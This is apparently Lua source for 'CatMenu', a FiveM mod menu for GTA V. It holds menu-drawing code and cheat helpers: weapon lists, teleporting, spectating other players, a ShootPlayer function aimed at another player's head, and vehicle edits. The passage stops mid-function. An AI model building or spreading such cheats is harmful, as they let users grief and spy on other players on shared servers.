CatMenu = {}

CatMenu.debug = false

local function RGBRainbow(frequency)
	local result = {}
	local curtime = GetGameTimer() / 1000

	result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
	result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
	result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

	return result
end

local menus = {}
local keys = {up = 172, down = 173, left = 174, right = 175, select = 176, back = 177}
local optionCount = 0

local currentKey = nil
local currentMenu = nil

local menuWidth = 0.23
local titleHeight = 0.20
local titleYOffset = 0.05
local titleScale = 1.3

local buttonHeight = 0.038
local buttonFont = 4
local buttonScale = 0.365
local buttonTextXOffset = 0.005
local buttonTextYOffset = 0.005

local function debugPrint(text)
	if CatMenu.debug then
		Citizen.Trace("[TMmenu] " .. tostring(text))
	end
end

local function setMenuProperty(id, property, value)
	if id and menus[id] then
		menus[id][property] = value
		debugPrint(id .. " menu property changed: { " .. tostring(property) .. ", " .. tostring(value) .. " }")
	end
end

local function isMenuVisible(id)
	if id and menus[id] then
		return menus[id].visible
	else
		return false
	end
end

local function setMenuVisible(id, visible, holdCurrent)
	if id and menus[id] then
		setMenuProperty(id, "visible", visible)

		if not holdCurrent and menus[id] then
			setMenuProperty(id, "currentOption", 1)
		end

		if visible then
			if id ~= currentMenu and isMenuVisible(currentMenu) then
				setMenuVisible(currentMenu, false)
			end

			currentMenu = id
		end
	end
end

local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
	SetTextColour(color.r, color.g, color.b, color.a)
	SetTextFont(font)
	SetTextScale(scale, scale)

	if shadow then
		SetTextDropShadow(2, 2, 0, 0, 0)
	end

	if menus[currentMenu] then
		if center then
			SetTextCentre(center)
		elseif alignRight then
			SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menuWidth - buttonTextXOffset)
			SetTextRightJustify(true)
		end
	end
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x, y)
end

local function drawRect(x, y, width, height, color)
	DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end

local function drawTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight / 2

		if menus[currentMenu].titleBackgroundSprite then
			DrawSprite(
				menus[currentMenu].titleBackgroundSprite.dict,
				menus[currentMenu].titleBackgroundSprite.name,
				x,
				y,
				menuWidth,
				titleHeight,
				0.,
				255,
				255,
				255,
				255
			)
		else
			drawRect(x, y, menuWidth, titleHeight, menus[currentMenu].titleBackgroundColor)
		end

		drawText(
			menus[currentMenu].title,
			x,
			y - titleHeight / 2 + titleYOffset,
			menus[currentMenu].titleFont,
			menus[currentMenu].titleColor,
			titleScale,
			true
		)
	end
end

local function drawSubTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight + buttonHeight / 2

		local subTitleColor = {
			r = menus[currentMenu].titleBackgroundColor.r,
			g = menus[currentMenu].titleBackgroundColor.g,
			b = menus[currentMenu].titleBackgroundColor.b,
			a = 255
		}

		drawRect(x, y, menuWidth, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
		drawText(
			menus[currentMenu].subTitle,
			menus[currentMenu].x + buttonTextXOffset,
			y - buttonHeight / 2 + buttonTextYOffset,
			buttonFont,
			subTitleColor,
			buttonScale,
			false
		)

		if optionCount > menus[currentMenu].maxOptionCount then
			drawText(
				tostring(menus[currentMenu].currentOption) .. " / " .. tostring(optionCount),
				menus[currentMenu].x + menuWidth,
				y - buttonHeight / 2 + buttonTextYOffset,
				buttonFont,
				subTitleColor,
				buttonScale,
				false,
				false,
				true
			)
		end
	end
end

local function drawButton(text, subText)
	local x = menus[currentMenu].x + menuWidth / 2
	local multiplier = nil

	if
		menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and
			optionCount <= menus[currentMenu].maxOptionCount
	 then
		multiplier = optionCount
	elseif
		optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and
			optionCount <= menus[currentMenu].currentOption
	 then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
		local backgroundColor = nil
		local textColor = nil
		local subTextColor = nil
		local shadow = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			subTextColor = menus[currentMenu].menuFocusTextColor
		else
			backgroundColor = menus[currentMenu].menuBackgroundColor
			textColor = menus[currentMenu].menuTextColor
			subTextColor = menus[currentMenu].menuSubTextColor
			shadow = true
		end

		drawRect(x, y, menuWidth, buttonHeight, backgroundColor)
		drawText(
			text,
			menus[currentMenu].x + buttonTextXOffset,
			y - (buttonHeight / 2) + buttonTextYOffset,
			buttonFont,
			textColor,
			buttonScale,
			false,
			shadow
		)

		if subText then
			drawText(
				subText,
				menus[currentMenu].x + buttonTextXOffset,
				y - buttonHeight / 2 + buttonTextYOffset,
				buttonFont,
				subTextColor,
				buttonScale,
				false,
				shadow,
				true
			)
		end
	end
end

function CatMenu.CreateMenu(id, title)
	-- Default settings
	menus[id] = {}
	menus[id].title = title
	menus[id].subTitle = "INTERACTION MENU"

	menus[id].visible = false

	menus[id].previousMenu = nil

	menus[id].aboutToBeClosed = false

	menus[id].x = 0.75
	menus[id].y = 0.19

	menus[id].currentOption = 1
	menus[id].maxOptionCount = 10
	menus[id].titleFont = 1
	menus[id].titleColor = {r = 255, g = 255, b = 255, a = 255}
	Citizen.CreateThread(
		function()
			while true do
				Citizen.Wait(0)
				local ra = RGBRainbow(1.0)-- RGB MENU DISABLED // NiT34ByTe
				--menus[id].titleBackgroundColor = {r = ra.r, g = ra.g, b = ra.b, a = 80} --RGB MENU DISABLED // NiT34ByTe - Culoare titlu
				--menus[id].menuFocusBackgroundColor = {r = ra.r, g = ra.g, b = ra.b, a = 255} --RGB MENU DISABLED // NiT34ByTe - Culoare meniu
				menus[id].titleBackgroundColor = {r = 0, g = 30, b = 120, a = 150}
				menus[id].menuFocusBackgroundColor = {r = 0, g = 30, b = 120, a = 150}
			end
		end)
	menus[id].titleBackgroundSprite = nil

	menus[id].menuTextColor = {r = 255, g = 255, b = 255, a = 255}
	menus[id].menuSubTextColor = {r = 189, g = 189, b = 189, a = 255}
	menus[id].menuFocusTextColor = {r = 255, g = 255, b = 255, a = 255}
	--menus[id].menuFocusBackgroundColor = { r = 245, g = 245, b = 245, a = 255 }
	menus[id].menuBackgroundColor = {r = 0, g = 0, b = 0, a = 100}

	menus[id].subTitleBackgroundColor = {
		r = menus[id].menuBackgroundColor.r,
		g = menus[id].menuBackgroundColor.g,
		b = menus[id].menuBackgroundColor.b,
		a = 255
	}

	menus[id].buttonPressedSound = {name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"} --https://pastebin.com/0neZdsZ5

	debugPrint(tostring(id) .. " menu created")
end

function CatMenu.CreateSubMenu(id, parent, subTitle)
	if menus[parent] then
		CatMenu.CreateMenu(id, menus[parent].title)

		if subTitle then
			setMenuProperty(id, "subTitle", string.upper(subTitle))
		else
			setMenuProperty(id, "subTitle", string.upper(menus[parent].subTitle))
		end

		setMenuProperty(id, "previousMenu", parent)

		setMenuProperty(id, "x", menus[parent].x)
		setMenuProperty(id, "y", menus[parent].y)
		setMenuProperty(id, "maxOptionCount", menus[parent].maxOptionCount)
		setMenuProperty(id, "titleFont", menus[parent].titleFont)
		setMenuProperty(id, "titleColor", menus[parent].titleColor)
		setMenuProperty(id, "titleBackgroundColor", menus[parent].titleBackgroundColor)
		setMenuProperty(id, "titleBackgroundSprite", menus[parent].titleBackgroundSprite)
		setMenuProperty(id, "menuTextColor", menus[parent].menuTextColor)
		setMenuProperty(id, "menuSubTextColor", menus[parent].menuSubTextColor)
		setMenuProperty(id, "menuFocusTextColor", menus[parent].menuFocusTextColor)
		setMenuProperty(id, "menuFocusBackgroundColor", menus[parent].menuFocusBackgroundColor)
		setMenuProperty(id, "menuBackgroundColor", menus[parent].menuBackgroundColor)
		setMenuProperty(id, "subTitleBackgroundColor", menus[parent].subTitleBackgroundColor)
	else
		debugPrint("Failed to create " .. tostring(id) .. " submenu: " .. tostring(parent) .. " parent menu doesn't exist")
	end
end

function CatMenu.CurrentMenu()
	return currentMenu
end

function CatMenu.OpenMenu(id)
	if id and menus[id] then
		PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
		setMenuVisible(id, true)

		if menus[id].titleBackgroundSprite then
			RequestStreamedTextureDict(menus[id].titleBackgroundSprite.dict, false)
			while not HasStreamedTextureDictLoaded(menus[id].titleBackgroundSprite.dict) do
				Citizen.Wait(0)
			end
		end

		debugPrint(tostring(id) .. " menu opened")
	else
		debugPrint("Failed to open " .. tostring(id) .. " menu: it doesn't exist")
	end
end

function CatMenu.IsMenuOpened(id)
	return isMenuVisible(id)
end

function CatMenu.IsAnyMenuOpened()
	for id, _ in pairs(menus) do
		if isMenuVisible(id) then
			return true
		end
	end

	return false
end

function CatMenu.IsMenuAboutToBeClosed()
	if menus[currentMenu] then
		return menus[currentMenu].aboutToBeClosed
	else
		return false
	end
end

function CatMenu.CloseMenu()
	if menus[currentMenu] then
		if menus[currentMenu].aboutToBeClosed then
			menus[currentMenu].aboutToBeClosed = false
			setMenuVisible(currentMenu, false)
			debugPrint(tostring(currentMenu) .. " menu closed")
			PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			optionCount = 0
			currentMenu = nil
			currentKey = nil
		else
			menus[currentMenu].aboutToBeClosed = true
			debugPrint(tostring(currentMenu) .. " menu about to be closed")
		end
	end
end

function CatMenu.Button(text, subText)
	local buttonText = text
	if subText then
		buttonText = "{ " .. tostring(buttonText) .. ", " .. tostring(subText) .. " }"
	end

	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawButton(text, subText)

		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				debugPrint(buttonText .. " button pressed")
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		debugPrint("Failed to create " .. buttonText .. " button: " .. tostring(currentMenu) .. " menu doesn't exist")

		return false
	end
end

function CatMenu.MenuButton(text, id)
	if menus[id] then
		if CatMenu.Button(text) then
			setMenuVisible(currentMenu, false)
			setMenuVisible(id, true, true)

			return true
		end
	else
		debugPrint("Failed to create " .. tostring(text) .. " menu button: " .. tostring(id) .. " submenu doesn't exist")
	end

	return false
end

function CatMenu.CheckBox(text, bool, callback)
	local checked = "~r~Off"
	if bool then
		checked = "~g~On"
	end

	if CatMenu.Button(text, checked) then
		bool = not bool
		debugPrint(tostring(text) .. " checkbox changed to " .. tostring(bool))
		callback(bool)

		return true
	end

	return false
end

function CatMenu.ComboBox(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if itemsCount > 1 and isCurrent then
		selectedItem = "← " .. tostring(selectedItem) .. " →"
	end

	if CatMenu.Button(text, selectedItem) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
			if currentIndex > 1 then
				currentIndex = currentIndex - 1
			else
				currentIndex = itemsCount
			end
		elseif currentKey == keys.right then
			if currentIndex < itemsCount then
				currentIndex = currentIndex + 1
			else
				currentIndex = 1
			end
		end
	else
		currentIndex = selectedIndex
	end

	callback(currentIndex, selectedIndex)
	return false
end

function CatMenu.Display()
	if isMenuVisible(currentMenu) then
		if menus[currentMenu].aboutToBeClosed then
			CatMenu.CloseMenu()
		else
			ClearAllHelpMessages()

			drawTitle()
			drawSubTitle()

			currentKey = nil

			if IsDisabledControlJustPressed(0, keys.down) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption < optionCount then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
				else
					menus[currentMenu].currentOption = 1
				end
			elseif IsDisabledControlJustPressed(0, keys.up) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption > 1 then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
				else
					menus[currentMenu].currentOption = optionCount
				end
			elseif IsDisabledControlJustPressed(0, keys.left) then
				currentKey = keys.left
			elseif IsDisabledControlJustPressed(0, keys.right) then
				currentKey = keys.right
			elseif IsDisabledControlJustPressed(0, keys.select) then
				currentKey = keys.select
			elseif IsDisabledControlJustPressed(0, keys.back) then
				if menus[menus[currentMenu].previousMenu] then
					PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
					setMenuVisible(menus[currentMenu].previousMenu, true)
				else
					CatMenu.CloseMenu()
				end
			end

			optionCount = 0
		end
	end
end

function CatMenu.SetMenuWidth(id, width)
	setMenuProperty(id, "width", width)
end

function CatMenu.SetMenuX(id, x)
	setMenuProperty(id, "x", x)
end

function CatMenu.SetMenuY(id, y)
	setMenuProperty(id, "y", y)
end

function CatMenu.SetMenuMaxOptionCountOnScreen(id, count)
	setMenuProperty(id, "maxOptionCount", count)
end

function CatMenu.SetTitleColor(id, r, g, b, a)
	setMenuProperty(id, "titleColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a})
end

function CatMenu.SetTitleBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"titleBackgroundColor",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a}
	)
end

function CatMenu.SetTitleBackgroundSprite(id, textureDict, textureName)
	setMenuProperty(id, "titleBackgroundSprite", {dict = textureDict, name = textureName})
end

function CatMenu.SetSubTitle(id, text)
	setMenuProperty(id, "subTitle", string.upper(text))
end

function CatMenu.SetMenuBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"menuBackgroundColor",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a}
	)
end

function CatMenu.SetMenuTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a})
end

function CatMenu.SetMenuSubTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuSubTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a})
end

function CatMenu.SetMenuFocusColor(id, r, g, b, a)
	setMenuProperty(id, "menuFocusColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a})
end

function CatMenu.SetMenuButtonPressedSound(id, name, set)
	setMenuProperty(id, "buttonPressedSound", {["name"] = name, ["set"] = set})
end

function KeyboardInput(TextEntry, ExampleText, MaxStringLength)
	AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
	DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
	blockinput = true

	while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
		Citizen.Wait(0)
	end

	if UpdateOnscreenKeyboard() ~= 2 then
		local result = GetOnscreenKeyboardResult()
		Citizen.Wait(500)
		blockinput = false
		return result
	else
		Citizen.Wait(500)
		blockinput = false
		return nil
	end
end

local function getPlayerIds()
	local players = {}
	for i = 0, GetNumberOfPlayers() do
		if NetworkIsPlayerActive(i) then
			players[#players + 1] = i
		end
	end
	return players
end


function DrawText3D(x, y, z, text, r, g, b)
	SetDrawOrigin(x, y, z, 0)
	SetTextFont(0)
	SetTextProportional(0)
	SetTextScale(0.0, 0.20)
	SetTextColour(r, g, b, 255)
	SetTextDropshadow(0, 0, 0, 0, 255)
	SetTextEdge(2, 0, 0, 0, 150)
	SetTextDropShadow()
	SetTextOutline()
	SetTextEntry("STRING")
	SetTextCentre(1)
	AddTextComponentString(text)
	DrawText(0.0, 0.0)
	ClearDrawOrigin()
end

function math.round(num, numDecimalPlaces)
	return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
end

local function RGBRainbow(frequency)
	local result = {}
	local curtime = GetGameTimer() / 1000

	result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
	result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
	result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

	return result
end

function drawNotification(text)
	SetNotificationTextEntry("STRING")
	AddTextComponentString(text)
	DrawNotification(false, false)
end



local allWeapons = {
	"WEAPON_KNIFE",
	"WEAPON_KNUCKLE",
	"WEAPON_NIGHTSTICK",
	"WEAPON_HAMMER",
	"WEAPON_BAT",
	"WEAPON_GOLFCLUB",
	"WEAPON_CROWBAR",
	"WEAPON_BOTTLE",
	"WEAPON_DAGGER",
	"WEAPON_HATCHET",
	"WEAPON_MACHETE",
	"WEAPON_FLASHLIGHT",
	"WEAPON_SWITCHBLADE",
	"WEAPON_PISTOL",
	"WEAPON_PISTOL_MK2",
	"WEAPON_COMBATPISTOL",
	"WEAPON_APPISTOL",
	"WEAPON_PISTOL50",
	"WEAPON_SNSPISTOL",
	"WEAPON_HEAVYPISTOL",
	"WEAPON_VINTAGEPISTOL",
	"WEAPON_STUNGUN",
	"WEAPON_FLAREGUN",
	"WEAPON_MARKSMANPISTOL",
	"WEAPON_REVOLVER",
	"WEAPON_MICROSMG",
	"WEAPON_SMG",
	"WEAPON_SMG_MK2",
	"WEAPON_ASSAULTSMG",
	"WEAPON_MG",
	"WEAPON_COMBATMG",
	"WEAPON_COMBATMG_MK2",
	"WEAPON_COMBATPDW",
	"WEAPON_GUSENBERG",
	"WEAPON_MACHINEPISTOL",
	"WEAPON_ASSAULTRIFLE",
	"WEAPON_ASSAULTRIFLE_MK2",
	"WEAPON_CARBINERIFLE",
	"WEAPON_CARBINERIFLE_MK2",
	"WEAPON_ADVANCEDRIFLE",
	"WEAPON_SPECIALCARBINE",
	"WEAPON_BULLPUPRIFLE",
	"WEAPON_COMPACTRIFLE",
	"WEAPON_PUMPSHOTGUN",
	"WEAPON_SAWNOFFSHOTGUN",
	"WEAPON_BULLPUPSHOTGUN",
	"WEAPON_ASSAULTSHOTGUN",
	"WEAPON_MUSKET",
	"WEAPON_HEAVYSHOTGUN",
	"WEAPON_DBSHOTGUN",
	"WEAPON_SNIPERRIFLE",
	"WEAPON_HEAVYSNIPER",
	"WEAPON_HEAVYSNIPER_MK2",
	"WEAPON_MARKSMANRIFLE",
	"WEAPON_GRENADELAUNCHER",
	"WEAPON_GRENADELAUNCHER_SMOKE",
	"WEAPON_RPG",
	"WEAPON_STINGER",
	"WEAPON_FIREWORK",
	"WEAPON_HOMINGLAUNCHER",
	"WEAPON_GRENADE",
	"WEAPON_STICKYBOMB",
	"WEAPON_PROXMINE",
	"WEAPON_BZGAS",
	"WEAPON_SMOKEGRENADE",
	"WEAPON_MOLOTOV",
	"WEAPON_FIREEXTINGUISHER",
	"WEAPON_PETROLCAN",
	"WEAPON_SNOWBALL",
	"WEAPON_FLARE",
	"WEAPON_BALL"
}

local Enabled = true

local function TeleportToWaypoint()
	if DoesBlipExist(GetFirstBlipInfoId(8)) then
		local blipIterator = GetBlipInfoIdIterator(8)
		local blip = GetFirstBlipInfoId(8, blipIterator)
		WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) --Thanks To Briglair [forum.FiveM.net]
		wp = true
	else
		drawNotification("~r~No waypoint!")
	end

	local zHeigt = 0.0
	height = 1000.0
	while true do
		Citizen.Wait(0)
		if wp then
			if
				IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
					(GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
			 then
				entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
			else
				entity = GetPlayerPed(-1)
			end

			SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
			FreezeEntityPosition(entity, true)
			local Pos = GetEntityCoords(entity, true)

			if zHeigt == 0.0 then
				height = height - 25.0
				SetEntityCoords(entity, Pos.x, Pos.y, height)
				bool, zHeigt = GetGroundZFor_3dCoord(Pos.x, Pos.y, Pos.z, 0)
			else
				SetEntityCoords(entity, Pos.x, Pos.y, zHeigt)
				FreezeEntityPosition(entity, false)
				wp = false
				height = 1000.0
				zHeigt = 0.0
				drawNotification("~g~Teleported to waypoint!")
				break
			end
		end
	end
end

function stringsplit(inputstr, sep)
	if sep == nil then
		sep = "%s"
	end
	local t = {}
	i = 1
	for str in string.gmatch(inputstr, "([^" .. sep .. "]+)") do
		t[i] = str
		i = i + 1
	end
	return t
end

local Spectating = false

function SpectatePlayer(player)
	local playerPed = PlayerPedId()
	Spectating = not Spectating
	local targetPed = GetPlayerPed(player)

	if (Spectating) then
		local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

		RequestCollisionAtCoord(targetx, targety, targetz)
		NetworkSetInSpectatorMode(true, targetPed)

		drawNotification("Spectating " .. GetPlayerName(player))
	else
		local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

		RequestCollisionAtCoord(targetx, targety, targetz)
		NetworkSetInSpectatorMode(false, targetPed)

		drawNotification("Stopped Spectating " .. GetPlayerName(player))
	end
end

function ShootPlayer(player)
	local head = GetPedBoneCoords(player, GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.0, 0.0)
	SetPedShootsAtCoord(PlayerPedId(), head.x, head.y, head.z, true)
end

function MaxOut(veh)
                    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, true)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
                    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3)
                    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4)
end

function DelVeh(veh)
	SetEntityAsMissionEntity(Object, 1, 1)
	DeleteEntity(Object)
	SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1)
	DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false))
end

function Clean(veh)
	SetVehicleDirtLevel(veh, 15.0)
end

function engine(veh)
					 SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)				
end

function Clean2(veh)
	SetVehicleDirtLevel(veh, 1.0)
end


entityEnumerator = {
	__gc = function(enum)
	  if enum.destructor and enum.handle then
		enum.destructor(enum.handle)
	  end
	  enum.destructor = nil
	  enum.handle = nil
	end
  }

function EnumerateEntities(initFunc, moveFunc, disposeFunc)
	return coroutine.wrap(function()
	  local iter, id = initFunc()
	  if not id or id == 0 then
		disposeFunc(iter)
		return
	  end
	  
	  local enum = {handle = iter, destructor = disposeFunc}
	  setmetatable(enum, entityEnumerator)
	  
	  local next = true
	  repeat
		coroutine.yield(id)
		next, id = moveFunc(iter)
	  until not next
	  
	  enum.destructor, enum.handle = nil, nil
	  disposeFunc(iter)
	end)
  end

  function EnumerateObjects()
	return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
  end

  function EnumeratePeds()
	return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
  end

  function EnumerateVehicles()
	return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
  end

  function EnumeratePickups()
	return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
  end

function RequestControl(entity)
	local Waiting = 0
